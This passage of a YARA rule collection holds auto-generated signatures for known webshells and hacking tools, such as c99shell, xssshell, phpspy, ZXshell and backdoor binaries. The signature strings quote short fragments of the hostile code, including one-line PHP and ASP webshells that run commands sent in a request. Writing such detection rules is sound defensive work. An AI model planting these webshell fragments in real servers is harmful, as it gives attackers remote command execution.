        fingerprint = "v1_sha256_6b0e602b523f58ec61850b4ba2e69da4fe4bf2833fb45e529785a398445db127"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file xssshell.asp"
        category = "INFO"
        hash = "8fc0ffc5e5fbe85f7706ffc45b3f79b4"

    strings:
        $s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"
    condition:
        all of them
}
rule FeliksPack3___PHP_Shells_usr {
    meta:
        id = "aOmeKArUCSk8mnZawAztl"
        fingerprint = "v1_sha256_f5fd4a4c1b531b23b09505d302dc27d7ba2eb733fcf313c04ba9085b090f7cbe"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file usr.php"
        category = "INFO"
        hash = "ade3357520325af50c9098dc8a21a024"

    strings:
        $s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"
    condition:
        all of them
}
rule FSO_s_phpinj {
    meta:
        id = "3UlZVb6n5OfG50FOsQDoFB"
        fingerprint = "v1_sha256_de4ac200f5426ec4c6fef21d5fbc37281811569a3e71a9bcb6fa51d13eb600a4"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file phpinj.php"
        category = "INFO"
        hash = "dd39d17e9baca0363cc1c3664e608929"

    strings:
        $s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"
    condition:
        all of them
}
rule xssshell_db {
    meta:
        id = "FS3tMVVH0xlU4LruLCV2c"
        fingerprint = "v1_sha256_3fdbaa17c12abef8576bf859065d90f4b6e80c187af734b71b26a1bd5d073e86"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file db.asp"
        category = "INFO"
        hash = "cb62e2ec40addd4b9930a9e270f5b318"

    strings:
        $s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"
    condition:
        all of them
}
rule PHP_sh {
    meta:
        id = "6eB0KV8JBMp52x0woDyMQQ"
        fingerprint = "v1_sha256_da0b572f116cc5c55e8d7469f222896d602d09be4761a0e2139fc8ce67ac4050"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file sh.php"
        category = "INFO"
        hash = "1e9e879d49eb0634871e9b36f99fe528"

    strings:
        $s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"
    condition:
        all of them
}
rule xssshell_default {
    meta:
        id = "E5N7a1wmmsMjdolP3G8AJ"
        fingerprint = "v1_sha256_6a8772a8a6399c3266abcc22a3c55eda70ec9703346398f5f1768bbd35974f8c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file default.asp"
        category = "INFO"
        hash = "d156782ae5e0b3724de3227b42fcaf2f"

    strings:
        $s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"
    condition:
        all of them
}
rule EditServer_2 {
    meta:
        id = "79X4TCZhc06Hdi9RMk9ElG"
        fingerprint = "v1_sha256_c581936928ce0f1061feb5665c743f14f12a9f875e360f40cc064f3047b23adf"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file EditServer.exe"
        category = "INFO"
        hash = "5c1f25a4d206c83cdfb006b3eb4c09ba"

    strings:
        $s0 = "@HOTMAIL.COM"
        $s1 = "Press Any Ke"
        $s3 = "glish MenuZ"
    condition:
        all of them
}
rule by064cli {
    meta:
        id = "5QqHCBLQ0uh6CN3isxGalc"
        fingerprint = "v1_sha256_51efd5c510efc6657ae175af47b09437ae70eb0237d88ffdf3cdae365d0ec7be"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file by064cli.exe"
        category = "INFO"
        hash = "10e0dff366968b770ae929505d2a9885"

    strings:
        $s7 = "packet dropped,redirecting"
        $s9 = "input the password(the default one is 'by')"
    condition:
        all of them
}
rule Mithril_dllTest {
    meta:
        id = "5b30jrH532UWc7NYuqjpFB"
        fingerprint = "v1_sha256_c8c8d1b75ed4eb4bc66a762e53aa6b3ab439e96ef464a8b9ffa4dff887986465"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file dllTest.dll"
        category = "INFO"
        hash = "a8d25d794d8f08cd4de0c3d6bf389e6d"

    strings:
        $s0 = "please enter the password:"
        $s3 = "\\dllTest.pdb"
    condition:
        all of them
}
rule peek_a_boo {
    meta:
        id = "1x2JDjoV12WjYXiAC1qZyy"
        fingerprint = "v1_sha256_b103c1b873dd0df9626d72a1127fbadc821777a05012a080423263a2083c398b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file peek-a-boo.exe"
        category = "INFO"
        hash = "aca339f60d41fdcba83773be5d646776"

    strings:
        $s0 = "__vbaHresultCheckObj"
        $s1 = "\\VB\\VB5.OLB"
        $s2 = "capGetDriverDescriptionA"
        $s3 = "__vbaExceptHandler"
        $s4 = "EVENT_SINK_Release"
        $s8 = "__vbaErrorOverflow"
    condition:
        all of them
}
rule fmlibraryv3 {
    meta:
        id = "6SnooCMM0r5sWhZaVSCbK7"
        fingerprint = "v1_sha256_a7dc83db26cdda757f626c42022c17bb2764074a3cc5f87b4a3aaa991fac5dc2"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file fmlibraryv3.asp"
        category = "INFO"
        hash = "c34c248fed6d5a20d8203924a2088acc"

    strings:
        $s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"
    condition:
        all of them
}
rule Debug_dllTest_2 {
    meta:
        id = "T3BW3tiwS4cYDSgvD6OIF"
        fingerprint = "v1_sha256_bf260ce0f8d4728920679573cd77927b44db28ba6102923707af8d1ad7d0ef2d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file dllTest.dll"
        category = "INFO"
        hash = "1b9e518aaa62b15079ff6edb412b21e9"

    strings:
        $s4 = "\\Debug\\dllTest.pdb"
        $s5 = "--list the services in the computer"
    condition:
        all of them
}
rule connector {
    meta:
        id = "3KUswwHGsjREZWYKpbphdJ"
        fingerprint = "v1_sha256_b8cadb7aa23a8cdef10e7b1eb05586d6c3e7c398958a80861b6f1ccd4edf1eca"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file connector.asp"
        category = "INFO"
        hash = "3ba1827fca7be37c8296cd60be9dc884"

    strings:
        $s2 = "If ( AttackID = BROADCAST_ATTACK )"
        $s4 = "Add UNIQUE ID for victims / zombies"
    condition:
        all of them
}
rule shelltools_g0t_root_HideRun {
    meta:
        id = "5cCglMB8xxgGqr6mRHvbDB"
        fingerprint = "v1_sha256_3a6dea2314800b28e92b59595c8b79c64e66dc66ebfa8f89c2f4028b574b9a91"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file HideRun.exe"
        category = "INFO"
        hash = "45436d9bfd8ff94b71eeaeb280025afe"

    strings:
        $s0 = "Usage -- hiderun [AppName]"
        $s7 = "PVAX SW, Alexey A. Popoff, Moscow, 1997."
    condition:
        all of them
}
rule regshell {
    meta:
        id = "oORJpgM5T7OIHgTSwoh9p"
        fingerprint = "v1_sha256_9d95b70afba2c45cd4cb7a47d41c0d18b02e0700349fad94682d2d82b6bbfe02"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file regshell.exe"
        category = "INFO"
        hash = "db2fdc821ca6091bab3ebd0d8bc46ded"

    strings:
        $s0 = "Changes the base hive to HKEY_CURRENT_USER."
        $s4 = "Displays a list of values and sub-keys in a registry Hive."
        $s5 = "Enter a menu selection number (1 - 3) or 99 to Exit: "
    condition:
        all of them
}
rule PHP_Shell_v1_7 {
    meta:
        id = "30nDbzgCLgXK4gweg2OFGw"
        fingerprint = "v1_sha256_e03904177309de9ce1afa0b12bf70913b106650c3db5807f9d4ccb91fb2ade77"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file PHP_Shell_v1.7.php"
        category = "INFO"
        hash = "b5978501c7112584532b4ca6fb77cba5"

    strings:
        $s8 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]"
    condition:
        all of them
}
rule xssshell_save {
    meta:
        id = "6djoQS0Dgzlaar8ruuCVa1"
        fingerprint = "v1_sha256_c53034c6ebc4f01c4573e688f548e71dae944913797b12eb8f22a5ef0a368ccf"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file save.asp"
        category = "INFO"
        hash = "865da1b3974e940936fe38e8e1964980"

    strings:
        $s4 = "RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID"
        $s5 = "VictimID = fm_NStr(Victims(i))"
    condition:
        all of them
}
rule screencap {
    meta:
        id = "5pEBUXAUAIrEXV6FoGaW3S"
        fingerprint = "v1_sha256_9be7ec97ef8e9b8838f7931a8fcf8d85b1543a202a7bf34fab9791fc47889cb9"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file screencap.exe"
        category = "INFO"
        hash = "51139091dea7a9418a50f2712ea72aa6"

    strings:
        $s0 = "GetDIBColorTable"
        $s1 = "Screen.bmp"
        $s2 = "CreateDCA"
    condition:
        all of them
}
rule FSO_s_phpinj_2 {
    meta:
        id = "1PRwe0Bq1JUBSGM8gKP0nV"
        fingerprint = "v1_sha256_12af5182b94f01ac4fbdee92c007556aaa7f196aca116575803cedd84b81f3b0"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file phpinj.php"
        category = "INFO"
        hash = "dd39d17e9baca0363cc1c3664e608929"

    strings:
        $s9 = "<? system(\\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO"
    condition:
        all of them
}
rule ZXshell2_0_rar_Folder_zxrecv {
    meta:
        id = "1WidRJOcVpdtwAhX58nLT4"
        fingerprint = "v1_sha256_7eef63e45f6902e4f2d5f854b2794df3101a2ef145e2d627263db429c2b728d7"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file zxrecv.exe"
        category = "INFO"
        hash = "5d3d12a39f41d51341ef4cb7ce69d30f"

    strings:
        $s0 = "RyFlushBuff"
        $s1 = "teToWideChar^FiYP"
        $s2 = "mdesc+8F D"
        $s3 = "\\von76std"
        $s4 = "5pur+virtul"
        $s5 = "- Kablto io"
        $s6 = "ac#f{lowi8a"
    condition:
        all of them
}
rule FSO_s_ajan {
    meta:
        id = "6ZRbpxBvnUDgVEI8FwwrY7"
        fingerprint = "v1_sha256_a7766caae5845ce43cff2212c25fea9a78979d10c79d8c40290b5c1471b101cd"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file ajan.asp"
        category = "INFO"
        hash = "22194f8c44524f80254e1b5aec67b03e"

    strings:
        $s4 = "entrika.write \"BinaryStream.SaveToFile"
    condition:
        all of them
}
rule c99shell {
    meta:
        id = "7RifroHIbkwo6JvBa2GKDy"
        fingerprint = "v1_sha256_a0fcc43a80ac4d059aea36da8b4b5a81c99a54f7c66c521697805ae890d66fe8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file c99shell.php"
        category = "INFO"
        hash = "90b86a9c63e2cd346fe07cea23fbfc56"

    strings:
        $s0 = "<br />Input&nbsp;URL:&nbsp;&lt;input&nbsp;name=\\\"uploadurl\\\"&nbsp;type=\\\"text\\\"&"
    condition:
        all of them
}
rule phpspy_2005_full {
    meta:
        id = "6xVi1LS7NEKd0vzRhntWx5"
        fingerprint = "v1_sha256_8561161726a49374a9bc3389fef593e5d68dc437552e06736a235412183bef45"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file phpspy_2005_full.php"
        category = "INFO"
        hash = "d1c69bb152645438440e6c903bac16b2"

    strings:
        $s7 = "echo \"  <td align=\\\"center\\\" nowrap valign=\\\"top\\\"><a href=\\\"?downfile=\".urlenco"
    condition:
        all of them
}
rule FSO_s_zehir4_2 {
    meta:
        id = "1zsK4mIiEJcB2QzcKU91eB"
        fingerprint = "v1_sha256_bb10f2e28bb375366b9140c06bb242cd13fdb69e67ce72ecae0e50270566f116"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file zehir4.asp"
        category = "INFO"
        hash = "5b496a61363d304532bcf52ee21f5d55"

    strings:
        $s4 = "\"Program Files\\Serv-u\\Serv"
    condition:
        all of them
}
rule httpdoor {
    meta:
        id = "3Bs6lOUMWuy7ZjCVD7RhGU"
        fingerprint = "v1_sha256_235e23fd952e291395bff06968d0f619568f807afb230a19a48e9fb995c20305"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file httpdoor.exe"
        category = "INFO"
        hash = "6097ea963455a09474471a9864593dc3"

    strings:
        $s4 = "''''''''''''''''''DaJKHPam"
        $s5 = "o,WideCharR]!n]"
        $s6 = "HAutoComplete"
        $s7 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?> <assembly xmlns=\"urn:sch"
    condition:
        all of them
}
rule FSO_s_indexer_2 {
    meta:
        id = "4edFFnAv1J6jJRFyExf7ap"
        fingerprint = "v1_sha256_8cf4c8fb1e985adbed2cf20578fcfc14240f6d9fe6062bbe3fe2f895f58bc172"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file indexer.asp"
        category = "INFO"
        hash = "135fc50f85228691b401848caef3be9e"

    strings:
        $s5 = "<td>Nerden :<td><input type=\"text\" name=\"nerden\" size=25 value=index.html></td>"
    condition:
        all of them
}
rule HYTop_DevPack_2005 {
    meta:
        id = "47eCnUuNwLFHgPiKuCQhjY"
        fingerprint = "v1_sha256_b312cddff4c5292cc51acc39448c815fede3c9356d7d225c3a08c7124712b3f8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file 2005.asp"
        category = "INFO"
        hash = "63d9fd24fa4d22a41fc5522fc7050f9f"

    strings:
        $s7 = "theHref=encodeForUrl(mid(replace(lcase(list.path),lcase(server.mapPath(\"/\")),\"\")"
        $s8 = "scrollbar-darkshadow-color:#9C9CD3;"
        $s9 = "scrollbar-face-color:#E4E4F3;"
    condition:
        all of them
}
rule _root_040_zip_Folder_deploy {
    meta:
        id = "7NpzVxaeu0sOIrZopQ1kHk"
        fingerprint = "v1_sha256_9852b105e6a28f5500fc6739b196dd14b9b0b69b1077be4063735380b0699abb"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file deploy.exe"
        category = "INFO"
        hash = "2c9f9c58999256c73a5ebdb10a9be269"

    strings:
        $s5 = "halon synscan 127.0.0.1 1-65536"
        $s8 = "Obviously you replace the ip address with that of the target."

    condition:
        all of them
}
rule by063cli {
    meta:
        id = "2jlyHR28PoQ3MiflckZ31r"
        fingerprint = "v1_sha256_c89159b73232bc8fd7430b3330009f4b3eb25b9511515bc9b4cd433f7a67f30e"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file by063cli.exe"
        category = "INFO"
        hash = "49ce26eb97fd13b6d92a5e5d169db859"

    strings:
        $s2 = "#popmsghello,are you all right?"
        $s4 = "connect failed,check your network and remote ip."
    condition:
        all of them
}
rule icyfox007v1_10_rar_Folder_asp {
    meta:
        id = "1pWmQpJ75SJ2yVkFgALBfL"
        fingerprint = "v1_sha256_3cc36668f0a2a6807b59c7da0b6e504b519a616ab63fb9f606eba5dc4a9e7e2f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file asp.asp"
        category = "INFO"
        hash = "2c412400b146b7b98d6e7755f7159bb9"

    strings:
        $s0 = "<SCRIPT RUNAT=SERVER LANGUAGE=JAVASCRIPT>eval(Request.form('#')+'')</SCRIPT>"
    condition:
        all of them
}
rule FSO_s_EFSO_2_2 {
    meta:
        id = "2qy8SzsqX83M6wheQpPDus"
        fingerprint = "v1_sha256_462c713e5d4fb6d0db91b14bfacdca73f780559ba2dad80988c356ee1a3d369d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file EFSO_2.asp"
        category = "INFO"
        hash = "a341270f9ebd01320a7490c12cb2e64c"

    strings:
        $s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
        $s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"
    condition:
        all of them
}
rule byshell063_ntboot_2 {
    meta:
        id = "4PykXscRtA7VvJJB8zA8co"
        fingerprint = "v1_sha256_25df29000bb410c0ba1fec78920124f6eedbc2585541536239522d2b116270ab"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file ntboot.dll"
        category = "INFO"
        hash = "cb9eb5a6ff327f4d6c46aacbbe9dda9d"

    strings:
        $s6 = "OK,job was done,cuz we have localsystem & SE_DEBUG_NAME:)"
    condition:
        all of them
}
rule u_uay {
    meta:
        id = "3fqwOPrksQQD82LGtT6PVR"
        fingerprint = "v1_sha256_45e8938ce34fd5a253cee3867aa8c4429c6bf3fcc91098ed9df3f95656bc5f8f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file uay.exe"
        category = "INFO"
        hash = "abbc7b31a24475e4c5d82fc4c2b8c7c4"

    strings:
        $s1 = "exec \"c:\\WINDOWS\\System32\\freecell.exe"
        $s9 = "SYSTEM\\CurrentControlSet\\Services\\uay.sys\\Security"
    condition:
        1 of them
}
rule bin_wuaus {
    meta:
        id = "45aCvNsCPDSGqwiHvyNUni"
        fingerprint = "v1_sha256_0509ca39662430c3ababf65ca3a6e9af95250163980829d90eddf5341168c864"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file wuaus.dll"
        category = "INFO"
        hash = "46a365992bec7377b48a2263c49e4e7d"

    strings:
        $s1 = "9(90989@9V9^9f9n9v9"
        $s2 = ":(:,:0:4:8:C:H:N:T:Y:_:e:o:y:"
        $s3 = ";(=@=G=O=T=X=\\="
        $s4 = "TCP Send Error!!"
        $s5 = "1\"1;1X1^1e1m1w1~1"
        $s8 = "=$=)=/=<=Y=_=j=p=z="
    condition:
        all of them
}
rule pwreveal {
    meta:
        id = "4LuhBoOpUXIycoW53HZToC"
        fingerprint = "v1_sha256_01c9582897c65e608d49a151fe9ade97b9a031d7d10f5fd4b4d0c2a3fd83e7b6"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file pwreveal.exe"
        category = "INFO"
        hash = "b4e8447826a45b76ca45ba151a97ad50"

    strings:
        $s0 = "*<Blank - no es"
        $s3 = "JDiamondCS "
        $s8 = "sword set> [Leith=0 bytes]"
        $s9 = "ION\\System\\Floating-"
    condition:
        all of them
}
rule shelltools_g0t_root_xwhois {
    meta:
        id = "2RvZh40sMdzeA48Zo8WYlB"
        fingerprint = "v1_sha256_75ee56dae5fde75ae4dc4bba835a96016781b747f3cff0dc6d52e665463a6070"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file xwhois.exe"
        category = "INFO"
        hash = "0bc98bd576c80d921a3460f8be8816b4"

    strings:
        $s1 = "rting! "
        $s2 = "aTypCog("
        $s5 = "Diamond"
        $s6 = "r)r=rQreryr"
    condition:
        all of them
}
rule vanquish_2 {
    meta:
        id = "4q6uEkWfLXLexs8t7d2sTr"
        fingerprint = "v1_sha256_428dc4e6d8bcc888e6f99f69ee9f211aa029d3486b99b9716d09709dc391d9a2"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file vanquish.exe"
        category = "INFO"
        hash = "2dcb9055785a2ee01567f52b5a62b071"

    strings:
        $s2 = "Vanquish - DLL injection failed:"
    condition:
        all of them
}
rule down_rar_Folder_down {
    meta:
        id = "4PNlLxNj1GixQQyHGg063j"
        fingerprint = "v1_sha256_bc666d6333d49a2b01553e1946fc304195193b9be92e26805474e64da61455da"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file down.asp"
        category = "INFO"
        hash = "db47d7a12b3584a2e340567178886e71"

    strings:
        $s0 = "response.write \"<font color=blue size=2>NetBios Name: \\\\\"  & Snet.ComputerName &"
    condition:
        all of them
}
rule cmdShell {
    meta:
        id = "2lHLIK74WchAJeEXlX7zFf"
        fingerprint = "v1_sha256_5e7c7537b355b162d58b8bce570b1f94a8e6b479856685a245ffaed8f9482680"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file cmdShell.asp"
        category = "INFO"
        hash = "8a9fef43209b5d2d4b81dfbb45182036"

    strings:
        $s1 = "if cmdPath=\"wscriptShell\" then"
    condition:
        all of them
}
rule ZXshell2_0_rar_Folder_nc {
    meta:
        id = "7UrvPbDiHkBCNoU05C0oOr"
        fingerprint = "v1_sha256_6106758aedb33f8983f387a58fcd815c47f793cd2a7ea3b0ebed13dd1d5b6e83"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file nc.exe"
        category = "INFO"
        hash = "2cd1bf15ae84c5f6917ddb128827ae8b"

    strings:
        $s0 = "WSOCK32.dll"
        $s1 = "?bSUNKNOWNV"
        $s7 = "p@gram Jm6h)"
        $s8 = "ser32.dllCONFP@"
    condition:
        all of them
}
rule portlessinst {
    meta:
        id = "48j7noz7jeXuBD4qaIRnc0"
        fingerprint = "v1_sha256_72ca80de2ad2048d1fcbbffeebd0e4fd7d9d47d6736360674e6a85ef9943abe8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file portlessinst.exe"
        category = "INFO"
        hash = "74213856fc61475443a91cd84e2a6c2f"

    strings:
        $s2 = "Fail To Open Registry"
        $s3 = "f<-WLEggDr\""
        $s6 = "oMemoryCreateP"
    condition:
        all of them
}
rule SetupBDoor {
    meta:
        id = "qsfUNdk3u0NLBNM6NOqj0"
        fingerprint = "v1_sha256_b4b6a0e4b9f8975d769d340a420af37dbc344d32c72447a8c56b05e985e6d806"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file SetupBDoor.exe"
        category = "INFO"
        hash = "41f89e20398368e742eda4a3b45716b6"

    strings:
        $s1 = "\\BDoor\\SetupBDoor"
    condition:
        all of them
}
rule phpshell_3 {
    meta:
        id = "2U7l3e4AVBNdIAFz0RHFYf"
        fingerprint = "v1_sha256_b86fa40fd7bbcae86926182882faa226530e44c20bc611b8433a7da7f012106c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file phpshell.php"
        category = "INFO"
        hash = "e8693a2d4a2ffea4df03bb678df3dc6d"

    strings:
        $s3 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>"
        $s5 = "      echo \"<option value=\\\"$work_dir\\\" selected>Current Directory</option>\\n\";"
    condition:
        all of them
}
rule BIN_Server {
    meta:
        id = "71jb2ZgIWIV2P2r28Ab5Zc"
        fingerprint = "v1_sha256_34f9d78e0f61717fae2945e7a833c2c6d59e28035ee95da2c5d32b4e196bc957"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Yara Bulk Rule Generator by Florian Roth"
        description = "Webshells Auto-generated - file Server.exe"
        category = "INFO"
        hash = "1d5aa9cbf1429bb5b8bf600335916dcd"

    strings:
        $s0 = "configserver"
        $s1 = "GetLogicalDrives"
        $s2 = "WinExec"
        $s4 = "fxftest"
        $s5 = "upfileok"
        $s7 = "upfileer"
